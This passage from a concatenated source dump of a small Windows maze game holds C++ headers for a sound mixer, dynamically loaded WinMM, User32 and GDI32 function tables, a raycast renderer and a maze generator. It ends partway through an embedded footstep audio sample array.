            u64 numSamples, u16 channels, u32 sampleRate);

#ifdef AUDIODATA_FILELOAD_USED
  // Create from an audio file of a specific file format
  AudioData(const char* filePath, AudioDataLoaderCallback callback);
#endif

  ~AudioData();



  inline void printHeader(const char* name = nullptr)
  { if(hdr != nullptr) hdr->printHeader(name); }

#ifdef AUDIODATA_SAVEAUDIO_USED
  // (This will overwrite any file named filePath! make sure to check
  //  with fileio_exists() unless you intend to overwrite the previous file)
  bool saveAudio(const char* filePath, AudioDataSaverCallback callback);
#endif

#ifdef AUDIODATA_CONVERTFORMAT_USED
  // The conversion method used is slightly inaccurate for a number of reasons.
  // This function only serves as a convenience, where accuracy isn't
  // needed beyond sounding more or less the same.
  //
  // (This will return early if hdr->format == format,
  //  since no conversion would be necessary)
  bool convertFormat(AudioSampleFormatEnum format);
#endif

};





/******************************************************************************/





struct SoundEngineTrack { //88B
  const AudioDataHeader* audio;

  // Time at the point of audio being queued, in seconds
  f64                timestamp;

  f64                 position;

  f64                  spd_old;
  f64                  spd_new;
  f64                 spdDelta;

  StereoF32            vol_old;
  StereoF32            vol_new;
  StereoF32           volDelta;
  StereoF32          volMaster;

  u16                    loops;
  bool                stopping;

  char             _padding[5];

};





// WARNING: IF A CURRENTLY PLAYING AUDIO CLIP IS DESTROYED BEFORE
// SOUNDENGINE, AN ACCESS VIOLATION MIGHT OCCUR IF ACTIVELY MIXING!

class SoundEngine {
  SoundEngineTrack _tracks[64];
  CRITICAL_SECTION   _lock;
  u16          _tracks_len = 64;
  u8              _padding;

public:
  // (ALL TRACKS MUST BE FULLY STOPPED BEFORE CHANGING SAMPLERATE,
  //  AS SAMPLERATE IS USED TO CALCULATE SOME AUDIO CLIP INFO!)

  bool    stopIfVolumeIsZero = true;
  f32             sampleRate = (f32)sample_rate; // The *device*'s sample rate
  StereoF32    volumeMaster = {1.0f, 1.0f};
  // (Only the left channel of volumeMaster
  //  is used if the source audio is mono)



  SoundEngine(u16 numTracks = 64, f32 _sampleRate = (f32)sample_rate);

  ~SoundEngine();



  bool isTrackPlaying(u16 track);

  u16        getActiveTracks();
  inline u16 getTrackCount(){ return _tracks_len; }



  // Sets the volume multiplier of a given track,
  // or all active tracks if track == 0xFFFF
  //
  // When forced == true, the volume state is set instantly, instead of
  // being interpolated over the course of the next call to mixTracks()
  bool setVolume(f32 volumeL, f32 volumeR,
                 u16 track = 0xFFFF, bool forced = false);

  // Sets the speed multiplier of a given track,
  // or all active tracks if track == 0xFFFF
  //
  // Forced has the same behavior as setVolume
  bool setSpeed(f64 speedNew,
                u16 track = 0xFFFF, bool forced = false);

  // Sets the change in volume over time for a given track.
  // or all active tracks if track == 0xFFFF
  //
  // DeltaSeconds is the time it will take for the volume
  // to go from 0.0x -> 1.0x (or vice versa)
  bool setVolumeDelta(f32 deltaSecondsL, f32 deltaSecondsR,
                      u16 track = 0xFFFF);

  // Same behavior as setVolumeDelta, except applied to the speed multiplier
  bool setSpeedDelta(f64 deltaSeconds,
                     u16 track = 0xFFFF);



  // Returns the track the audio was queued into,
  // or 0xFFFF if no empty track was found,
  // or 0xFFFE on error
  u16 play(const AudioData& audio, // (only f32 or StereoF32 samples allowed!)
           f32 volumeL = 1.0f, f32 volumeR = 1.0f, f64 speed = 1.0);

  // (Make sure to stop all tracks before freeing any instances of AudioData,
  //  as to avoid any issues related to dangling pointers and whatnot)
  //
  // (Also, unless forced is set to true, this function
  //  won't work if stopIfVolumeIsZero is false!)
  bool stop(u16 track = 0xFFFF, bool forced = false);



  // Returns false if timeout is reached, true otherwise
  //
  // Set timeoutSeconds to 0 to wait indefinitely
  bool waitForTrack(f64 timeoutSeconds = 0, u16 track = 0xFFFF);



  // buffer_len is in elements, not bytes
  //
  // Returns referenceTimestamp, or 0.0 on error
  f64 mixTracks(StereoF32* buffer, size_t buffer_len,
                f64 referenceTimestamp = timeGetSeconds());

};





#endif /* SOUND_STUFF_USED */

#endif /* _SOUND_STUFF_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\include\win32\audio.hpp"":
#ifndef _WIN32_AUDIO_HPP
#define _WIN32_AUDIO_HPP

#include <public_stuff.hpp>

#include <windows.h>
#include <mmsystem.h>



#define timeGetDevCaps         _Winmm_func.timeGetDevCaps_
#define timeBeginPeriod        _Winmm_func.timeBeginPeriod_

#define waveOutGetNumDevs      _Winmm_func.waveOutGetNumDevs_
#define waveOutGetDevCapsA     _Winmm_func.waveOutGetDevCapsA_
#define waveOutGetVolume       _Winmm_func.waveOutGetVolume_
#define waveOutSetVolume       _Winmm_func.waveOutSetVolume_
#define waveOutGetErrorTextA   _Winmm_func.waveOutGetErrorTextA_
#define waveOutOpen            _Winmm_func.waveOutOpen_
#define waveOutClose           _Winmm_func.waveOutClose_
#define waveOutPrepareHeader   _Winmm_func.waveOutPrepareHeader_
#define waveOutUnprepareHeader _Winmm_func.waveOutUnprepareHeader_
#define waveOutWrite           _Winmm_func.waveOutWrite_
#define waveOutPause           _Winmm_func.waveOutPause_
#define waveOutRestart         _Winmm_func.waveOutRestart_
#define waveOutReset           _Winmm_func.waveOutReset_
#define waveOutBreakLoop       _Winmm_func.waveOutBreakLoop_
#define waveOutGetPosition     _Winmm_func.waveOutGetPosition_
#define waveOutGetPitch        _Winmm_func.waveOutGetPitch_
#define waveOutSetPitch        _Winmm_func.waveOutSetPitch_
#define waveOutGetPlaybackRate _Winmm_func.waveOutGetPlaybackRate_
#define waveOutSetPlaybackRate _Winmm_func.waveOutSetPlaybackRate_
#define waveOutGetID           _Winmm_func.waveOutGetID_
#define waveOutMessage         _Winmm_func.waveOutMessage_

union _Winmm_func_t {
  FARPROC ptrs[1];

  struct {
    // Idk why these first two are in WinMM at all, but whatever
    MMRESULT (WINAPI *timeGetDevCaps_)(LPTIMECAPS, UINT);
    MMRESULT (WINAPI *timeBeginPeriod_)(UINT);

    //UINT     (WINAPI *waveOutGetNumDevs_)(void);
    MMRESULT (WINAPI *waveOutGetDevCapsA_)(UINT_PTR, LPWAVEOUTCAPSA, UINT);
    //MMRESULT (WINAPI *waveOutGetVolume_)(HWAVEOUT, LPDWORD);
    MMRESULT (WINAPI *waveOutSetVolume_)(HWAVEOUT, DWORD);
    //MMRESULT (WINAPI *waveOutGetErrorTextA_)(MMRESULT, LPSTR, UINT);
    MMRESULT (WINAPI *waveOutOpen_)(LPHWAVEOUT, UINT, LPCWAVEFORMATEX, DWORD_PTR, DWORD_PTR, DWORD);
    //MMRESULT (WINAPI *waveOutClose_)(HWAVEOUT);
    MMRESULT (WINAPI *waveOutPrepareHeader_)(HWAVEOUT, LPWAVEHDR, UINT);
    //MMRESULT (WINAPI *waveOutUnprepareHeader_)(HWAVEOUT, LPWAVEHDR, UINT);
    MMRESULT (WINAPI *waveOutWrite_)(HWAVEOUT, LPWAVEHDR, UINT);
    MMRESULT (WINAPI *waveOutPause_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutRestart_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutReset_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutBreakLoop_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutGetPosition_)(HWAVEOUT, LPMMTIME, UINT);
    //MMRESULT (WINAPI *waveOutGetPitch_)(HWAVEOUT, LPDWORD);
    //MMRESULT (WINAPI *waveOutSetPitch_)(HWAVEOUT, DWORD);
    //MMRESULT (WINAPI *waveOutGetPlaybackRate_)(HWAVEOUT, LPDWORD);
    //MMRESULT (WINAPI *waveOutSetPlaybackRate_)(HWAVEOUT, DWORD);
    //MMRESULT (WINAPI *waveOutGetID_)(HWAVEOUT, LPUINT);
    //MMRESULT (WINAPI *waveOutMessage_)(HWAVEOUT, UINT, DWORD_PTR, DWORD_PTR);
  };
};

extern _Winmm_func_t _Winmm_func;
extern char          _Winmm_names_a[];
extern char          _Winmm_names_b[];



/******************************************************************************/



// Stereo audio samples as two 16-bit signed ints
struct StereoS16 { s16 l,r; };



int WaveOutInit();

void WaveOutQuit();



#endif /* _WIN32_AUDIO_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\include\win32\input.hpp"":
#ifndef _WIN32_INPUT_HPP
#define _WIN32_INPUT_HPP

#include <windows.h>

#include <public_stuff.hpp>



int InputInit();

void InputQuit();



union Event; // Forward declaration

// Returns false if queue is full
bool AddToEventQueue(Event& event);

// Returns a EVENT_NULL event if queue is empty
Event RemoveFromEventQueue();



#endif /* _WIN32_INPUT_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\include\win32\video.hpp"":
#ifndef _WIN32_VIDEO_HPP
#define _WIN32_VIDEO_HPP

#include <windows.h>



#define RegisterClassA          _User32_func.RegisterClassA_
#define CreateWindowExA         _User32_func.CreateWindowExA_
#define DefWindowProcA          _User32_func.DefWindowProcA_
#define InvalidateRect          _User32_func.InvalidateRect_
#define UpdateWindow            _User32_func.UpdateWindow_
#define BeginPaint              _User32_func.BeginPaint_
#define EndPaint                _User32_func.EndPaint_
#define PeekMessageA            _User32_func.PeekMessageA_
#define DispatchMessageA        _User32_func.DispatchMessageA_
#define DestroyWindow           _User32_func.DestroyWindow_
#define ReleaseDC               _User32_func.ReleaseDC_
#define GetDC                   _User32_func.GetDC_
#define PostQuitMessage         _User32_func.PostQuitMessage_
#define MessageBoxA             _User32_func.MessageBoxA_
#define TranslateMessage        _User32_func.TranslateMessage_
#define GetWindowLongA          _User32_func.GetWindowLongA_
#define AdjustWindowRectEx      _User32_func.AdjustWindowRectEx_
#define LoadCursorA             _User32_func.LoadCursorA_
#define MapVirtualKeyA          _User32_func.MapVirtualKeyA_
#define GetCursorPos            _User32_func.GetCursorPos_
#define ScreenToClient          _User32_func.ScreenToClient_
#define ShowCursor              _User32_func.ShowCursor_
#define ClipCursor              _User32_func.ClipCursor_
#define GetClientRect           _User32_func.GetClientRect_
#define ClientToScreen          _User32_func.ClientToScreen_
#define SetCapture              _User32_func.SetCapture_
#define ReleaseCapture          _User32_func.ReleaseCapture_
#define SetCursorPos            _User32_func.SetCursorPos_
#define RegisterRawInputDevices _User32_func.RegisterRawInputDevices_
#define GetRawInputData         _User32_func.GetRawInputData_

union _User32_func_t {
  FARPROC ptrs[1];

  struct {
    ATOM    (WINAPI *RegisterClassA_)(CONST WNDCLASSA*);
    HWND    (WINAPI *CreateWindowExA_)(DWORD, LPCSTR, LPCSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
    LRESULT (WINAPI *DefWindowProcA_)(HWND, UINT, WPARAM, LPARAM);
    WINBOOL (WINAPI *InvalidateRect_)(HWND, CONST RECT*, WINBOOL);
    WINBOOL (WINAPI *UpdateWindow_)(HWND);
    HDC     (WINAPI *BeginPaint_)(HWND, LPPAINTSTRUCT);
    WINBOOL (WINAPI *EndPaint_)(HWND, CONST PAINTSTRUCT*);
    WINBOOL (WINAPI *PeekMessageA_)(LPMSG, HWND, UINT, UINT, UINT);
    LRESULT (WINAPI *DispatchMessageA_)(CONST MSG*);
    WINBOOL (WINAPI *DestroyWindow_)(HWND);
  //int     (WINAPI *ReleaseDC_)(HWND, HDC);
  //HDC     (WINAPI *GetDC_)(HWND);
    VOID    (WINAPI *PostQuitMessage_)(int);
    int     (WINAPI *MessageBoxA_)(HWND, LPCSTR, LPCSTR, UINT);
    WINBOOL (WINAPI *TranslateMessage_)(CONST MSG*);
    LONG    (WINAPI *GetWindowLongA_)(HWND, int);
    WINBOOL (WINAPI *AdjustWindowRectEx_)(LPRECT, DWORD, WINBOOL, DWORD);
    HCURSOR (WINAPI *LoadCursorA_)(HINSTANCE, LPCSTR);
    UINT    (WINAPI *MapVirtualKeyA_)(UINT, UINT);
  //WINBOOL (WINAPI *GetCursorPos_)(LPPOINT);
    WINBOOL (WINAPI *ScreenToClient_)(HWND, LPPOINT);
    int     (WINAPI *ShowCursor_)(WINBOOL);
    WINBOOL (WINAPI *ClipCursor_)(CONST RECT*);
    WINBOOL (WINAPI *GetClientRect_)(HWND, LPRECT);
    WINBOOL (WINAPI *ClientToScreen_)(HWND, LPPOINT);
    HWND    (WINAPI *SetCapture_)(HWND);
    WINBOOL (WINAPI *ReleaseCapture_)(VOID);
    WINBOOL (WINAPI *SetCursorPos_)(int, int);
    WINBOOL (WINAPI *RegisterRawInputDevices_)(PCRAWINPUTDEVICE, UINT, UINT);
    UINT    (WINAPI *GetRawInputData_)(HRAWINPUT, UINT, LPVOID, PUINT, UINT);
  };
};

extern _User32_func_t _User32_func;
extern char           _User32_names_a[];



/******************************************************************************/



#define CreateCompatibleDC     _Gdi32_func.CreateCompatibleDC_
#define CreateDIBSection       _Gdi32_func.CreateDIBSection_
#define SelectObject           _Gdi32_func.SelectObject_
#define DeleteObject           _Gdi32_func.DeleteObject_
#define BitBlt                 _Gdi32_func.BitBlt_
#define DeleteDC               _Gdi32_func.DeleteDC_
#define StretchBlt             _Gdi32_func.StretchBlt_
#define CreateCompatibleBitmap _Gdi32_func.CreateCompatibleBitmap_
#define SetStretchBltMode      _Gdi32_func.SetStretchBltMode_
#define SetDIBColorTable       _Gdi32_func.SetDIBColorTable_
#define CreateSolidBrush       _Gdi32_func.CreateSolidBrush_

union _Gdi32_func_t {
  FARPROC ptrs[1];

  struct {
    HDC     (WINAPI *CreateCompatibleDC_)(HDC);
    HBITMAP (WINAPI *CreateDIBSection_)(HDC, CONST BITMAPINFO*, UINT, VOID**, HANDLE, DWORD);
    HGDIOBJ (WINAPI *SelectObject_)(HDC, HGDIOBJ);
    WINBOOL (WINAPI *DeleteObject_)(HGDIOBJ);
    WINBOOL (WINAPI *BitBlt_)(HDC, int, int, int, int, HDC, int, int, DWORD);
    WINBOOL (WINAPI *DeleteDC_)(HDC);
    WINBOOL (WINAPI *StretchBlt_)(HDC, int, int, int, int, HDC, int, int, int, int, DWORD);
    HBITMAP (WINAPI *CreateCompatibleBitmap_)(HDC, int, int);
    int     (WINAPI *SetStretchBltMode_)(HDC, int);
    UINT    (WINAPI *SetDIBColorTable_)(HDC, UINT, UINT, CONST RGBQUAD*);
    HBRUSH  (WINAPI *CreateSolidBrush_)(COLORREF);
  };
};

extern _Gdi32_func_t _Gdi32_func;
extern char          _Gdi32_names_a[];



/******************************************************************************/



int WindowInit(HINSTANCE hThisInst);

void WindowQuit();



#endif /* _WIN32_VIDEO_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\draw_raycast_scene.hpp"":
#ifndef _DRAW_RAYCAST_SCENE_HPP
#define _DRAW_RAYCAST_SCENE_HPP

#include <public_stuff.hpp>





// This assumes point has a length of 1
static inline Fpoint2d create_2d_vector(f32 angleRads,
                                        f32 magnitude)
{
  return {cosf(angleRads)*magnitude, sinf(angleRads)*magnitude};
}





void fill_scanlines(u32 y, u32 len, Color8 color,
                    Color8* dst = pixels);





#define RAYCAST_TEX_SIZE 32
#define RAYCAST_TEX_SIZE_TOTAL (8 + RAYCAST_TEX_SIZE*RAYCAST_TEX_SIZE)

void draw_raycast_scene(const s32* map, Point2d map_size,
                        Fpoint3d pos, // (pos.z is the angle, in radians)
                        const Color8 tiles[][RAYCAST_TEX_SIZE_TOTAL],
                        Color8 colorCeiling = 0xC0, Color8 colorFloor = 0x90,
                        u32 renderDistance = 100, f32 fov = 90.0f,
                        Color8* dst = pixels);





#endif /* _DRAW_RAYCAST_SCENE_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\generate_maze.hpp"":
#ifndef _GENERATE_MAZE_HPP
#define _GENERATE_MAZE_HPP

#include <public_stuff.hpp>



#define START_X 1
#define START_Y 1

// w & h must be odd, otherwise the south-eastern edges will be carved!
bool generate_maze(s32* map, u32 w, u32 h, s32 fillValue = 1);





#endif /* _GENERATE_MAZE_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\map_and_textures.hpp"":
//22050Hz, s16, mono
#define FOOTSTEP0_HERTZ    22050
#define FOOTSTEP0_FORMAT   SMPFMT_S16
#define FOOTSTEP0_CHANNELS 1
u8 footstep0_data[] = {0xFF, 0xFF, 0x08, 0x00, 0x37, 0x00, 0x6D, 0x00, 0xAD, 0x00, 0x03, 0x01, 0x59, 0x01, 0xAD, 0x01, 0xC8, 0x01, 0x77, 0x01, 0x7A, 0x00, 0x3B, 0xFE, 0x30, 0xFB, 0x23, 0xF8, 0xB8, 0xF4, 0x84, 0xF0, 0x5E, 0xEB, 0x10, 0xE6, 0x0C, 0xE1, 0x3F, 0xDD, 0x2E, 0xDC, 0x2B, 0xDE, 0x6F, 0xE1, 0x7F, 0xE5, 0x59, 0xEC, 0xE1, 0xF5, 0xAB, 0x03, 0xF2, 0x12, 0x3F, 0x21, 0xD2, 0x2F, 0x36, 0x3D, 0xBE, 0x47, 0xAF, 0x4B, 0x59, 0x4B, 0xF5, 0x4A, 0xDF, 0x4A, 0xB3, 0x4A, 0x71, 0x49, 0x7D, 0x46, 0xB3, 0x3E, 0x5D, 0x33, 0x2B, 0x27, 0x4C, 0x1A, 0x68, 0x0C, 0x25, 0xFE, 0xD4, 0xF0, 0xEC, 0xE3, 0x14, 0xD6, 0x73, 0xC8, 0xC7, 0xBD, 0xA9, 0xB4, 0x9A, 0xAC, 0xA6, 0xA7, 0x14, 0xA5, 0x53, 0xA4, 0xCB, 0xA4, 0x73, 0xA5, 0xB5, 0xA6, 0xAE, 0xAA, 0x9E, 0xB1, 0x92, 0xB9, 0x90, 0xC2, 0x6E, 0xCC, 0xC9, 0xD7, 0x9C, 0xE3, 0x0B, 0xEF, 0x60, 0xFA, 0x4A, 0x05, 0xAF, 0x0E, 0x7A, 0x17, 0xBA, 0x1F, 0x04, 0x26, 0x54, 0x2A, 0x97, 0x2C, 0xC7, 0x2D, 0x68, 0x2E, 0x4E, 0x2D, 0xE0, 0x2A, 0x94, 0x28, 0xA4, 0x26, 0x02, 0x24, 0x10, 0x21, 0x86, 0x1E, 0x53, 0x1D, 0x9A, 0x1C, 0x13, 0x1C, 0x5B, 0x1C, 0x79, 0x1D, 0x58, 0x1E, 0xF8, 0x1D, 0x79, 0x1D, 0xB8, 0x1D, 0x53, 0x1D, 0x08, 0x1B, 0xE8, 0x18, 0xB4, 0x16, 0x1A, 0x13, 0xF0, 0x0E, 0x34, 0x0B, 0x67, 0x07, 0x3C, 0x03, 0xC7, 0xFE, 0x3F, 0xFA, 0xA0, 0xF6, 0x74, 0xF3, 0x18, 0xF0, 0xC3, 0xEC, 0xC1, 0xEA, 0xD7, 0xE9, 0xE4, 0xE8, 0x92, 0xE8, 0x2B, 0xE9, 0x20, 0xEA, 0x46, 0xEB, 0x29, 0xED, 0x49, 0xEF, 0x6A, 0xF1, 0xC4, 0xF3, 0x55, 0xF6, 0xE8, 0xF8, 0x1F, 0xFB, 0xBB, 0xFC, 0xE8, 0xFD, 0xDC, 0xFE, 0x79, 0xFF, 0xA3, 0xFF, 0xCB, 0xFF, 0x3F, 0x00, 0xD2, 0x00, 0x76, 0x01, 0x26, 0x02, 0x4A, 0x02, 0x69, 0x02, 0x26, 0x03, 0x7B, 0x04, 0x3E, 0x05, 0x71, 0x05, 0x2B, 0x06, 0xFC, 0x06, 0xCC, 0x07, 0xE9, 0x07, 0xF8, 0x07, 0x7F, 0x08, 0x13, 0x08, 0x56, 0x06, 0x4A, 0x04, 0x08, 0x04, 0x2F, 0x03, 0x3F, 0x01, 0xD0, 0x00, 0xED, 0x00, 0x8E, 0xFF, 0x7A, 0xFE, 0xAF, 0xFE, 0xD8, 0xFE, 0x04, 0xFF, 0x41, 0xFF, 0xB8, 0xFF, 0xD0, 0x00, 0x4A, 0x01, 0xEB, 0x00, 0xBC, 0x00, 0x0C, 0x01, 0xBF, 0x00, 0x8F, 0xFF, 0xEA, 0xFE, 0x93, 0xFE, 0xC6, 0xFD, 0x8E, 0xFC, 0xA0, 0xFB, 0x16, 0xFB, 0xFA, 0xFA, 0x23, 0xFB, 0xCB, 0xFA, 0x65, 0xFA, 0x71, 0xFA, 0xF3, 0xFA, 0x7E, 0xFB, 0x1C, 0xFC, 0x03, 0xFD, 0x2A, 0xFE, 0x69, 0xFF, 0xD6, 0xFF, 0x54, 0xFF, 0xF0, 0xFD, 0x0F, 0xFC, 0xB9, 0xF9, 0x55, 0xF6, 0x5D, 0xF2, 0x95, 0xEE, 0x0A, 0xEC, 0x84, 0xEC, 0x48, 0xEF, 0x34, 0xF3, 0xCE, 0xFA, 0x62, 0x05, 0x29, 0x11, 0x6B, 0x1D, 0xEF, 0x27, 0x98, 0x2E, 0xA7, 0x2F, 0xA2, 0x2E, 0xB1, 0x2E, 0x06, 0x2E, 0x9C, 0x2A, 0xCA, 0x23, 0xBB, 0x19, 0x8B, 0x0E, 0x49, 0x03, 0x37, 0xF8, 0x04, 0xED, 0xBD, 0xE1, 0x5C, 0xD7, 0xC8, 0xCF, 0xB7, 0xCA, 0xC7, 0xC7, 0x27, 0xC7, 0x03, 0xC7, 0xC6, 0xC7, 0x1D, 0xCB, 0x0A, 0xD1, 0x8C, 0xD8, 0xEB, 0xE0, 0x07, 0xEA, 0x0D, 0xF4, 0x22, 0xFE, 0x40, 0x07, 0x8E, 0x0F, 0xB3, 0x16, 0x7E, 0x1B, 0x1B, 0x1E, 0x40, 0x1F, 0x2A, 0x1F, 0x0F, 0x1E, 0xDB, 0x1B, 0x36, 0x19, 0x55, 0x16, 0x35, 0x14, 0xED, 0x12, 0xC7, 0x11, 0x3D, 0x11, 0xCD, 0x10, 0x17, 0x10, 0x9A, 0x0F, 0xD8, 0x0E, 0x8F, 0x0D, 0x51, 0x0B, 0xA7, 0x08, 0x4D, 0x05, 0x4A, 0x02, 0xA3, 0xFF, 0x6E, 0xFC, 0x98, 0xF9, 0xDE, 0xF6, 0x79, 0xF4, 0xB7, 0xF2, 0x1A, 0xF2, 0x0E, 0xF2, 0x75, 0xF1, 0x07, 0xF2, 0x0F, 0xF4, 0x9D, 0xF5, 0xDA, 0xF6, 0x72, 0xF8, 0x60, 0xFA, 0xE2, 0xFB, 0xA3, 0xFD, 0xD5, 0xFF, 0xCF, 0x00, 0x29, 0x01, 0x81, 0x01, 0x1D, 0x02, 0x80, 0x02, 0x4D, 0x02, 0xF6, 0x01, 0x02, 0x02, 0xDD, 0x02, 0xBF, 0x03, 0x3E, 0x04, 0x79, 0x04, 0x9D, 0x04, 0x42, 0x05, 0xA0, 0x05, 0x95, 0x04, 0x90, 0x03, 0x31, 0x03, 0x25, 0x03, 0xFE, 0x01, 0x52, 0x01, 0xB0, 0x01, 0x07, 0x02, 0x8B, 0x02, 0x81, 0x02, 0x19, 0x03, 0xEF, 0x03, 0xED, 0x03, 0x54, 0x03, 0x4E, 0x02, 0x55, 0x01, 0x1E, 0x00, 0xF5, 0xFE, 0xCB, 0xFD, 0x00, 0xFC, 0xF9, 0xFA, 0xED, 0xFA, 0xA7, 0xFA, 0xF8, 0xF9, 0xE6, 0xF9, 0x72, 0xFA, 0xE4, 0xFA, 0x13, 0xFC, 0xE1, 0xFD, 0x20, 0xFF, 0x10, 0x00, 0xDB, 0x00, 0x47, 0x01, 0x3A, 0x01, 0xFD, 0x00, 0xB8, 0x00, 0x60, 0x00, 0xAA, 0x00, 0x38, 0x00, 0x2D, 0xFF, 0x31, 0xFF, 0xD7, 0xFF, 0x02, 0x00, 0xDB, 0xFF, 0xFA, 0xFF, 0x47, 0x00, 0x44, 0x00, 0x44, 0x00, 0x3E, 0x00, 0x6D, 0x00, 0x81, 0x00, 0xC8, 0xFF, 0x25, 0xFF, 0xF4, 0xFE, 0xC8, 0xFE, 0x95, 0xFE, 0xA0, 0xFE, 0x34, 0xFF, 0xD2, 0xFF, 0xA8, 0x00, 0x9F, 0x01, 0xF5, 0x02, 0x09, 0x04, 0x17, 0x05, 0x77, 0x05, 0x5A, 0x05, 0x79, 0x05, 0x46, 0x05, 0x1B, 0x04, 0xD0, 0x02, 0x23, 0x02, 0x53, 0x01, 0x42, 0x00, 0xF8, 0xFE, 0x44, 0xFE, 0xBA, 0xFD, 0xBE, 0xFC, 0x9E, 0xFB, 0x3B, 0xFB, 0xC5, 0xFB, 0x7A, 0xFC, 0x5F, 0xFD, 0x18, 0xFE, 0x06, 0xFF, 0x11, 0x00, 0xA2, 0x00, 0x5A, 0x01, 0x5E, 0x02, 0x06, 0x03, 0x7B, 0x02, 0xA5, 0x01, 0x6B, 0x01, 0xCD, 0x01, 0x74, 0x02, 0x36, 0x02, 0x0E, 0x02, 0x8A, 0x01, 0x62, 0x00, 0x56, 0xFF, 0xF1, 0xFE, 0x0F, 0xFF, 0xB0, 0xFE, 0xA0, 0xFE, 0x8C, 0xFF, 0x2B, 0x00, 0xAB, 0x00, 0x4A, 0x01, 0x88, 0x01, 0x91, 0x01, 0xF5, 0x01, 0x9D, 0x02, 0x7A, 0x02, 0x42, 0x02, 0xD0, 0x01, 0xF1, 0x00, 0xEE, 0xFF, 0xBE, 0xFE, 0xC8, 0xFD, 0x73, 0xFC, 0x3F, 0xFB, 0x0F, 0xFA, 0x71, 0xF9, 0x44, 0xF9, 0x37, 0xF9, 0xF4, 0xF9, 0xEA, 0xFA, 0x70, 0xFC, 0x98, 0xFD, 0x32, 0xFE, 0xB2, 0xFE, 0xDE, 0xFE, 0x8B, 0xFF, 0x8D, 0x00, 0x90, 0x01, 0xB7, 0x02, 0xA7, 0x03, 0xA9, 0x04, 0x22, 0x05, 0x84, 0x05, 0xBE, 0x05, 0x30, 0x06, 0xE0, 0x06, 0xDA, 0x06, 0xEF, 0x05, 0x6F, 0x04, 0x59, 0x03, 0x4D, 0x02, 0x3B, 0x01, 0xB8, 0x00, 0x65, 0x00, 0x67, 0x00, 0x4E, 0x00, 0x0F, 0x00, 0xF4, 0xFF, 0xF6, 0xFF, 0x32, 0x00, 0x4D, 0x00, 0xC2, 0x00, 0x70, 0x01, 0x61, 0x02, 0x56, 0x03, 0x8D, 0x03, 0xAE, 0x03, 0x00, 0x04, 0x7A, 0x04, 0xA2, 0x04, 0x4D, 0x04, 0xB8, 0x03, 0xEE, 0x02, 0x5D, 0x02, 0xAE, 0x01, 0x1F, 0x00, 0x29, 0xFE, 0x8B, 0xFC, 0x3C, 0xFB, 0x06, 0xFA, 0xBF, 0xF8, 0x98, 0xF7, 0x19, 0xF7, 0xCB, 0xF6, 0xE1, 0xF6, 0x89, 0xF7, 0xDE, 0xF8, 0xFA, 0xF9, 0x63, 0xFA, 0xFA, 0xFA, 0xD0, 0xFB, 0xC9, 0xFC, 0x27, 0xFD, 0x3A, 0xFD, 0x95, 0xFD, 0xBE, 0xFD, 0xB6, 0xFD, 0x96, 0xFD, 0x7F, 0xFD, 0x60, 0xFD, 0xAD, 0xFD, 0x7F, 0xFE, 0x9E, 0xFF, 0xFD, 0x00, 0x4B, 0x02, 0x6D, 0x03, 0x8C, 0x04, 0x19, 0x06, 0xC8, 0x07, 0xF8, 0x08, 0x84, 0x09, 0xC0, 0x09, 0xA2, 0x09, 0x2A, 0x09, 0x71, 0x08, 0x27, 0x07, 0x6C, 0x05, 0x71, 0x03, 0x47, 0x01, 0x8B, 0xFF, 0x9C, 0xFE, 0x90, 0xFE, 0xE2, 0xFE, 0x18, 0xFF, 0x81, 0xFF, 0x86, 0x00, 0x9C, 0x01, 0xB0, 0x02, 0xBC, 0x03, 0xA5, 0x04, 0x4D, 0x05, 0x31, 0x05, 0x82, 0x04, 0x33, 0x03, 0x43, 0x01, 0xFA, 0xFE, 0xE2, 0xFC, 0xF0, 0xFA, 0xDE, 0xF8, 0xE3, 0xF6, 0x78, 0xF5, 0xC3, 0xF4, 0x80, 0xF4, 0x9D, 0xF4, 0x5C, 0xF5, 0x68, 0xF6, 0x7F, 0xF7, 0x1D, 0xF9, 0x6B, 0xFB, 0xAA, 0xFD, 0x8D, 0xFF, 0x2E, 0x01, 0xA8, 0x02, 0xEE, 0x03, 0xEF, 0x04, 0x7B, 0x05, 0xD3, 0x05, 0x55, 0x06, 0x5F, 0x06, 0xDB, 0x05, 0x17, 0x05, 0x2B, 0x04, 0xE3, 0x02, 0x5F, 0x01, 0x91, 0xFF, 0x8C, 0xFD, 0xFA, 0xFB, 0xD4, 0xFA, 0xC9, 0xF9, 0x99, 0xF8, 0x0C, 0xF8, 0x68, 0xF8, 0xAA, 0xF8, 0xDB, 0xF8, 0x66, 0xF9, 0x31, 0xFA, 0x5D, 0xFB, 0x65, 0xFC, 0x63, 0xFD, 0x24, 0xFE, 0xBE, 0xFE, 0x02, 0xFF, 0x41, 0xFF, 0x8C, 0xFF, 0x68, 0xFF, 0x28, 0xFF, 0x1A, 0xFF, 0x30, 0xFF, 0x64, 0xFF, 0xA7, 0xFF, 0x12, 0x00, 0x7C, 0x00, 0x0B, 0x01, 0xB1, 0x01, 0x1A, 0x02, 0x5D, 0x02, 0x2B, 0x02, 0x6F, 0x01, 0xC5, 0x00, 0x11, 0x00, 0xDD, 0xFE, 0x37, 0xFD, 0xDA, 0xFB, 0xD5, 0xFA, 0x0E, 0xFA, 0x7C, 0xF9, 0x14, 0xF9, 0x0C, 0xF9, 0x5A, 0xF9, 0x1E, 0xFA, 0xDE, 0xFA, 0x06, 0xFC, 0xDC, 0xFD, 0xBB, 0xFF, 0x44, 0x01, 0x73, 0x02, 0x40, 0x03, 0x92, 0x03, 0xA4, 0x03, 0xA9, 0x03, 0x8D, 0x03, 0xEA, 0x02, 0xEE, 0x01, 0x07, 0x01, 0xF0, 0xFF, 0xD1, 0xFE, 0xEA, 0xFD, 0x31, 0xFD, 0xB6, 0xFC, 0x81, 0xFC, 0x73, 0xFC, 0xBB, 0xFC, 0x57, 0xFD, 0x4A, 0xFE, 0x62, 